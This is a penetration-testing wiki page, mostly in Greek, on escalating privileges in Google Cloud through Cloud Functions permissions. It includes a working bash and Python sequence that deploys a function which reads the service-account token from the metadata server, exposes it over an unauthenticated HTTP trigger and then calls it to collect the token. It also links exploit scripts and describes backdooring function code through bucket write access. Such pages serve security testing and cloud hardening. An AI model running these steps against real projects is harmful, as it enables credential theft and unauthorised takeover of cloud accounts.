# GCP - Cloudfunctions Privesc

{{#include ../../../banners/hacktricks-training.md}}

## cloudfunctions

Περισσότερες πληροφορίες σχετικά με τις Cloud Functions:

{{#ref}}
../gcp-services/gcp-cloud-functions-enum.md
{{#endref}}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Ένας επιτιθέμενος με αυτά τα δικαιώματα μπορεί να **δημιουργήσει μια νέα Cloud Function με αυθαίρετο (κακόβουλο) κώδικα και να της αναθέσει έναν Service Account**. Στη συνέχεια, να διαρρεύσει το token του Service Account από τα μεταδεδομένα για να κλιμακώσει τα δικαιώματα σε αυτόν.\
Ορισμένα δικαιώματα για την ενεργοποίηση της λειτουργίας μπορεί να απαιτούνται.

Τα σενάρια εκμετάλλευσης για αυτή τη μέθοδο μπορούν να βρεθούν [εδώ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) και [εδώ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) και το προεγκατεστημένο αρχείο .zip μπορεί να βρεθεί [εδώ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Ένας επιτιθέμενος με αυτά τα δικαιώματα μπορεί να **τροποποιήσει τον κώδικα μιας Function και ακόμη και να τροποποιήσει τον service account που είναι συνδεδεμένος** με στόχο την εξαγωγή του token.

> [!CAUTION]
> Για να αναπτύξετε cloud functions θα χρειαστείτε επίσης δικαιώματα actAs πάνω από τον προεπιλεγμένο service account υπολογιστή ή πάνω από τον service account που χρησιμοποιείται για την κατασκευή της εικόνας.

Ορισμένα επιπλέον δικαιώματα όπως η άδεια `.call` για την έκδοση 1 των cloudfunctions ή ο ρόλος `role/run.invoker` για την ενεργοποίηση της λειτουργίας μπορεί να απαιτούνται.
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
> [!CAUTION]
> Αν λάβετε το σφάλμα `Permission 'run.services.setIamPolicy' denied on resource...` είναι επειδή χρησιμοποιείτε την παράμετρο `--allow-unauthenticated` και δεν έχετε αρκετά δικαιώματα για αυτό.

Το exploit script για αυτή τη μέθοδο μπορεί να βρεθεί [εδώ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

Με αυτή την άδεια μπορείτε να αποκτήσετε μια **υπογεγραμμένη διεύθυνση URL για να μπορέσετε να ανεβάσετε ένα αρχείο σε έναν κάδο λειτουργίας (αλλά ο κώδικας της λειτουργίας δεν θα αλλάξει, πρέπει ακόμα να τον ενημερώσετε)**
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
Not really sure how useful only this permission is from an attackers perspective, but good to know.

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

Δώστε στον εαυτό σας οποιοδήποτε από τα προηγούμενα **`.update`** ή **`.create`** δικαιώματα για να κλιμακώσετε.

### `cloudfunctions.functions.update`

Μόνο με **`cloudfunctions`** δικαιώματα, χωρίς **`iam.serviceAccounts.actAs`** δεν **θα μπορείτε να ενημερώσετε τη λειτουργία ΟΠΟΤΕ ΑΥΤΟ ΔΕΝ ΕΙΝΑΙ ΜΙΑ ΕΓΚΥΡΗ ΚΛΙΜΑΚΩΣΗ.**

### Read & Write Access over the bucket

Εάν έχετε δικαιώματα ανάγνωσης και εγγραφής πάνω από τον κάδο, μπορείτε να παρακολουθείτε τις αλλαγές στον κώδικα και όποτε συμβαίνει μια **ενημέρωση στον κάδο μπορείτε να ενημερώσετε τον νέο κώδικα με τον δικό σας κώδικα** ώστε η νέα έκδοση της Cloud Function να εκτελείται με τον υποβληθέντα κώδικα με backdoor.

Μπορείτε να ελέγξετε περισσότερα σχετικά με την επίθεση στο:

{{#ref}}
gcp-storage-privesc.md
{{#endref}}

Ωστόσο, δεν μπορείτε να το χρησιμοποιήσετε για να προ-συμβιβάσετε τρίτες Cloud Functions γιατί αν δημιουργήσετε τον κάδο στον λογαριασμό σας και του δώσετε δημόσια δικαιώματα ώστε το εξωτερικό έργο να μπορεί να γράψει πάνω του, λαμβάνετε το εξής σφάλμα:

<figure><img src="../../../images/image (1) (1) (1).png" alt="" width="304"><figcaption></figcaption></figure>

> [!CAUTION]
> Ωστόσο, αυτό θα μπορούσε να χρησιμοποιηθεί για επιθέσεις DoS.

### Read & Write Access over Artifact Registry

Όταν δημιουργείται μια Cloud Function, μια νέα εικόνα docker αποστέλλεται στο Artifact Registry του έργου. Προσπάθησα να τροποποιήσω την εικόνα με μια νέα και ακόμη και να διαγράψω την τρέχουσα εικόνα (και την εικόνα `cache`) και τίποτα δεν άλλαξε, η cloud function συνεχίζει να λειτουργεί. Επομένως, ίσως **να είναι δυνατό να καταχραστεί μια επίθεση Race Condition** όπως με τον κάδο για να αλλάξει το docker container που θα εκτελείται αλλά **απλά τροποποιώντας την αποθηκευμένη εικόνα δεν είναι δυνατό να συμβιβαστεί η Cloud Function**.

## References

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
